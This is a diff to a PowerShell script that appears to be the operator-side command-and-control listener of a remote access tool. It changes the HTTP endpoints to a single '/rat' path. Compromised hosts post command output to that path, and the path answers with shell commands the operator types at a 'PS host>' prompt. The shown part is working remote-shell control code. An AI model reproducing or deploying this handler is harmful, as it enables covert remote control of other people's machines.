@@ -141,13 +141,15 @@ while ($true) {
     $request = $context.Request
     $response = $context.Response
 	$hostip = $request.RemoteEndPoint
-    if ($request.Url -match '/fetch$' ) { # 
+	
+    if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "POST") ) { 
+		Receive-Request($request)	
+	}
+    if ($request.Url -match '/rat$' ) { # 
         $response.ContentType = 'text/plain'
         $message = Read-Host "PS $hostip>"		
     }		
-    if ($request.Url -match '/response$' -and ($request.HttpMethod -eq "POST") ) { 
-		Receive-Request($request)	
-	}
+    
 
     [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
     $response.ContentLength64 = $buffer.length
@@ -157,4 +159,3 @@ while ($true) {
 }
 
 $listener.Stop()
-
